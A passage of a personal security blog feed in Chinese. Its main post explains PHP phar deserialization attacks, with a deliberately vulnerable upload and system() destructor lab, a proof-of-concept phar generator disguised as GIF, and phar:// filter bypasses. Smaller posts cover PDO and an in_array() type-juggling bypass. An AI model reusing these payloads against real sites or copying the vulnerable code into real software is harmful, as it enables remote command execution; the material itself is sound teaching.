&lt;img src=&quot;/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png&quot; class title=&quot;Da4er&quot;&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>利用phar进行反序列化扩展攻击简单总结</title>
    <link href="https://da4er.top/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-15T03:59:09.000Z</published>
    <updated>2020-03-15T04:08:29.047Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一般的反序列化漏洞都是要通过unserialize函数，进行反序列化之后才能触发的。但是如果在没有unserialize函数触发前提下，那么该怎么利用反序列化漏洞呢？这里就需要使用phar://进行等效替代。</p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件的组成"><a href="#phar文件的组成" class="headerlink" title="phar文件的组成"></a>phar文件的组成</h4><p>phar://的官方解释如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1.png" class title="This is an test image"><p>简单解释就是：通过phar://的处理可以把多个文件合成一个文件(类似压缩),但是php却可以不经过解压的方法，将多个文件解释执行。</p><p>phar文件结构分为四个部分组成：stub(文件标志)，meta-data，压缩文件内容，签名。<br>一. <strong>stub  文件标志</strong><br>格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx&lt;?php xxxxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure><p>二.<strong>meta-data</strong><br>每个被压缩的文件的权限，属性等信息都放在这里，这部分会以<strong>序列化</strong>的方式存储到phar文件的meta-data部分。<br><strong>这个部分是触发反序化的关键。</strong><br>三.<strong>压缩文件内容</strong><br>被压缩的文件的内容。<br>四.<strong>签名，放在文件末尾，格式如下</strong>：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/2.png" class title="This is an test image"><p>在PHP中我们不需要手动去写phar文件，因为php提供了一个phar类直接调用其中的方法即可。<br>一个小的demo文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Da4er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        var_dump(<span class="string">"https://da4er.top"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果存在phar文件先删除</span></span><br><span class="line">@unlink(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"da4er1.phar"</span>);</span><br><span class="line"><span class="comment">//开始生成phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">//设置phar文件标志</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line"><span class="comment">//自定义的meta-data文件</span></span><br><span class="line">$o = <span class="keyword">new</span> Da4er();</span><br><span class="line">$phar-&gt;setMetadata($o);<span class="comment">//将自定义的meta-data文件存入phar文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line"><span class="comment">//在停止写入phar文件，自动生成签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/3.png" class title="This is an test image"><p>发现我们自定义的meta-data反序化写入到了phar文件中。</p><h4 id="触发反序化的文件函数"><a href="#触发反序化的文件函数" class="headerlink" title="触发反序化的文件函数"></a>触发反序化的文件函数</h4><p>经过上面对phar文件的理解，我们清除了phar文件中包含序列化对象，那么该怎么利用呢。这里就需要使用php内置的文件处理函数。<strong>因为大部分的文件处理函数在底层都是调用的unserialize函数。</strong><br>参考博客：<a href="https://xz.aliyun.com/t/2958#toc-0">1</a><br>受影响的文件函数如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/4.png" class title="This is an test image"><p>如果这些文件函数的参数<strong>可控</strong>的话，我们就可以进行反序化漏洞的利用。<br>demo代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Da4er&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        var_dump(&quot;https:&#x2F;&#x2F;da4er.top&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename &#x3D; &quot;phar:&#x2F;&#x2F;da4er1.phar&quot;;</span><br><span class="line">@file_get_contents($filename);</span><br></pre></td></tr></table></figure><p>触发效果如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/5.png" class title="This is an test image"><p>常见的绕过方式：如果题目限制的不能以phar://开头，那么我们可以使用如下方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;da4er1.phar</span><br><span class="line"></span><br><span class="line">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;da4er1.phar</span><br></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>经过对phar进行的反序列化攻击的原理说明，我们清楚了在没有unserilize的前提下，还是可以进行反序化漏洞的利用的。 但是phar的利用还是要清楚下面几点利用条件：<br><strong>1.phar文件能上传到服务器</strong><br><strong>2.文件处理函数的参数可控</strong><br><strong>3.用可以的魔法方法作为跳板</strong><br><strong>4.没有过滤像phar一些特殊字符</strong></p><h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><p>自己在本地写个文件上传代码进行测试，代码如下：<br>upload.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;</span><br><span class="line">            文件上传页面</span><br><span class="line">        &lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;check_file.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;filename&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>check_file.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_rand_filename()</span><br><span class="line">&#123;</span><br><span class="line">    $base_filename&#x3D;@date(&quot;YmdHis&quot;);</span><br><span class="line">    &#x2F;&#x2F;形成六位随机数</span><br><span class="line">    for ($i&#x3D;0;$i&lt;6;$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        switch (mt_rand(0,2))</span><br><span class="line">        &#123;</span><br><span class="line">            case (0):</span><br><span class="line">                $base_filename .&#x3D;chr(mt_rand(97,122));</span><br><span class="line">                break;</span><br><span class="line">            case (1):</span><br><span class="line">                $base_filename .&#x3D;chr(mt_rand(65,90));</span><br><span class="line">            case (2):</span><br><span class="line">                $base_filename .&#x3D;mt_rand(0,9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $base_filename;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$maxsize&#x3D;1024*1024*3;</span><br><span class="line">$accept_filename&#x3D;[&quot;image&#x2F;jpg&quot;,&quot;image&#x2F;jpeg&quot;,&quot;image&#x2F;png&quot;,&quot;image&#x2F;gif&quot;];</span><br><span class="line">if (!in_array($_FILES[&quot;filename&quot;][&quot;type&quot;],$accept_filename))</span><br><span class="line">&#123;</span><br><span class="line">    exit(&quot;不允许上传&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$info&#x3D;pathinfo($_FILES[&quot;filename&quot;][&quot;name&quot;],PATHINFO_EXTENSION);</span><br><span class="line">$basename&#x3D;get_rand_filename();</span><br><span class="line">$filname&#x3D;$basename.&quot;.&quot;.$info;</span><br><span class="line">$base_dir&#x3D;&quot;G:&#x2F;&#x2F;PHPstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP&#x2F;ceshi&#x2F;phar&#x2F;exercise&#x2F;upload&quot;;</span><br><span class="line">$dest&#x3D;$base_dir.&quot;&#x2F;&quot;.$filname;</span><br><span class="line">$tmp&#x3D;$_FILES[&quot;filename&quot;][&quot;tmp_name&quot;];</span><br><span class="line">move_uploaded_file($tmp,$dest);</span><br><span class="line">echo $dest;</span><br></pre></td></tr></table></figure><p>bug.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$finame &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&quot;name&quot;]:&quot;&quot;;</span><br><span class="line">class OjectTest&#123;</span><br><span class="line">    public $u1s1&#x3D;&quot;111&quot;;</span><br><span class="line">    public function __construct($u)&#123;</span><br><span class="line">        $this-&gt;u1s1 &#x3D; $u;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;u1s1);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">if(file_exists($finame))&#123;</span><br><span class="line">    $da4er &#x3D; new OjectTest();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    exit(&quot;1&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;&#39;utf-8&#39;&quot;);</span><br><span class="line">class OjectTest&#123;</span><br><span class="line">    public $u1s1;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果存在phar文件先删除</span><br><span class="line">@unlink(&quot;da4er.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;da4er.phar&quot;);</span><br><span class="line">&#x2F;&#x2F;开始生成phar文件</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">&#x2F;&#x2F;设置phar文件标志</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">&#x2F;&#x2F;自定义的meta-data文件</span><br><span class="line">$o &#x3D; new OjectTest();</span><br><span class="line">$o-&gt;u1s1 &#x3D; &quot;ipconfig&quot;;</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;将自定义的meta-data文件存入phar文件</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">&#x2F;&#x2F;在停止写入phar文件，自动生成签名</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>最终的执行效果：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/6.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;一般的反序列化漏洞都是要通过unserialize函数，进行反序列化之后才能触发的。但是如果在没有unserialize函数触发前提下，那么该怎么利用反序列化漏洞呢？这里就需要使用phar://进行等效替代。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP中的PDO预处理机制</title>
    <link href="https://da4er.top/PHP%E4%B8%AD%E7%9A%84PDO%E9%A2%84%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6.html"/>
    <id>https://da4er.top/PHP%E4%B8%AD%E7%9A%84PDO%E9%A2%84%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6.html</id>
    <published>2020-03-09T15:19:41.000Z</published>
    <updated>2020-03-09T15:20:29.251Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>具体代码如下，PDO预处理机制主要用于数据库交互。<br>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create By Da4er.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//使用pdo连接数据库</span></span><br><span class="line">$dsn = <span class="string">"mysql:host=127.0.0.1;port=3306;dbname=pikachu;charset=utf8"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$pasword =<span class="string">"123"</span>;</span><br><span class="line">$PDOObject =<span class="keyword">new</span> PDO($dsn, $username, $pasword);</span><br><span class="line">var_dump($PDOObject);</span><br><span class="line"><span class="comment">//对象常用方法</span></span><br><span class="line"><span class="comment">//exec()函数 执行sql语句，返回影响的行数</span></span><br><span class="line"><span class="comment">//$sql = "insert into users(id,username,password) values (null,'admin','345')";</span></span><br><span class="line"><span class="comment">//$count = $PDOObject-&gt;exec($sql);</span></span><br><span class="line"><span class="comment">//echo "影响的行数为:&#123;$count&#125;";</span></span><br><span class="line"><span class="comment">//query()函数，执行一个sql语句 返回一个结果集</span></span><br><span class="line"><span class="comment">//$sql = "select * from users";</span></span><br><span class="line"><span class="comment">//$result = $PDOObject-&gt;query($sql);</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line"><span class="comment">//lastInsertId() 返回最后插入行的id或序列值(string类型)</span></span><br><span class="line"><span class="comment">//$sql = "insert into users(id,username,password) values (null,'admin','345')";</span></span><br><span class="line"><span class="comment">//$count = $PDOObject-&gt;exec($sql);</span></span><br><span class="line"><span class="comment">//echo "影响的行数为:&#123;$count&#125;";</span></span><br><span class="line"><span class="comment">//$id = $PDOObject-&gt;lastInsertId();</span></span><br><span class="line"><span class="comment">//echo $id;</span></span><br><span class="line"><span class="comment">//setAttribute()设置pdo的一些通用属性 看手册</span></span><br><span class="line"><span class="comment">//PDOStatement对象常用方法</span></span><br><span class="line"><span class="comment">// fetch()从结果集中获取一行，并向下移动指针</span></span><br><span class="line">$sql = <span class="string">"select * from users"</span>;</span><br><span class="line"><span class="comment">//$result = $PDOObject-&gt;query($sql);</span></span><br><span class="line"><span class="comment">//while($arr=$result-&gt;fetch(PDO::FETCH_ASSOC))&#123;</span></span><br><span class="line"><span class="comment">//    print_r($arr);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//fetchALL()返回一个包含结果集中所有行的数组</span></span><br><span class="line">$result = $PDOObject-&gt;query($sql);</span><br><span class="line">$arr = $result-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line"><span class="comment">//foreach ($arr as $key=&gt;$value)&#123;</span></span><br><span class="line"><span class="comment">//    foreach ($value as $key2=&gt;$value2)&#123;</span></span><br><span class="line"><span class="comment">//        echo $key2."=&gt;".$value2."\r\n";</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//rowCount()返回影响行数</span></span><br><span class="line">$count = $result-&gt;rowCount();</span><br><span class="line"><span class="keyword">echo</span> $count;</span><br><span class="line"><span class="comment">//PDO预处理 important</span></span><br><span class="line"><span class="comment">//使用问号占位符</span></span><br><span class="line">$sql = <span class="string">"insert into users(id,username,password) values (?,?,?)"</span>;</span><br><span class="line">$result = $PDOObject-&gt;prepare($sql);</span><br><span class="line">$result-&gt;bindValue(<span class="number">1</span>,<span class="number">12</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="number">2</span>,<span class="string">"da4er"</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="number">3</span>,<span class="string">"qweasdzxc"</span>);</span><br><span class="line">$result-&gt;execute();</span><br><span class="line"><span class="comment">//使用值占位符</span></span><br><span class="line">$sql = <span class="string">"insert into users(id,username,password) values (:id,:username,:password)"</span>;</span><br><span class="line">$result = $PDOObject-&gt;prepare($sql);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":id"</span>,<span class="number">13</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":username"</span>,<span class="string">"admin888"</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":password"</span>,<span class="string">"888"</span>);</span><br><span class="line">$result-&gt;execute();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;具体代码如下，PDO预处理机制主要用于数据库交互。&lt;br&gt;代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;tabl
      
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Python os标准库</title>
    <link href="https://da4er.top/Python-os%E6%A0%87%E5%87%86%E5%BA%93.html"/>
    <id>https://da4er.top/Python-os%E6%A0%87%E5%87%86%E5%BA%93.html</id>
    <published>2020-03-09T10:15:53.000Z</published>
    <updated>2020-03-09T10:17:24.222Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b2d8fc68c60b481b01f6dbfe2f1bd3fd3dea8f4f8b3a654240f3d6dfa4a23354"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Python sys标准库学习</title>
    <link href="https://da4er.top/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://da4er.top/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-06T10:35:33.000Z</published>
    <updated>2020-03-06T10:37:09.689Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="50defaca4203d446863e40cb64961c66687f5c95433ce224b43fb4779ce1f5b0"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP-Audit-Labs练习 持续更新....</title>
    <link href="https://da4er.top/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-05T06:00:15.000Z</published>
    <updated>2020-03-10T10:45:23.269Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h4 id="in-array-函数漏洞"><a href="#in-array-函数漏洞" class="headerlink" title="in_array()函数漏洞"></a>in_array()函数漏洞</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><a id="more"></a><p>这个漏洞的关键在于第三个参数上，如果没设置为true就会出现问题。<br>题目给的代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><p>我们发现post传进去的rate参数，只使用了in_array函数进行过滤并且没有设置第三个参数为true。<br>那么我们传入<strong>rate=3shell.php</strong>的话，在使用in_array()进行检查的时候，会<strong>先把rate转换成3</strong>，然后在判断是否存在。这样就会绕过in_array检测机制。<br>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><h5 id="1-使用intval强制转换成int类型"><a href="#1-使用intval强制转换成int类型" class="headerlink" title="1.使用intval强制转换成int类型"></a>1.使用intval强制转换成int类型</h5><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><p>这样即使我们输入的参数不合法，也会被强制转换为int类型，从而不会造成危害。</p><h5 id="2-将in-array函数的第三个参数设置为true"><a href="#2-将in-array函数的第三个参数设置为true" class="headerlink" title="2.将in_array函数的第三个参数设置为true"></a>2.将in_array函数的第三个参数设置为true</h5><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><p>这样在比较的时候，要求类型也要一样，从而不会绕过。</p><h4 id="CTF-Docker-题目"><a href="#CTF-Docker-题目" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h4><p>主要代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class 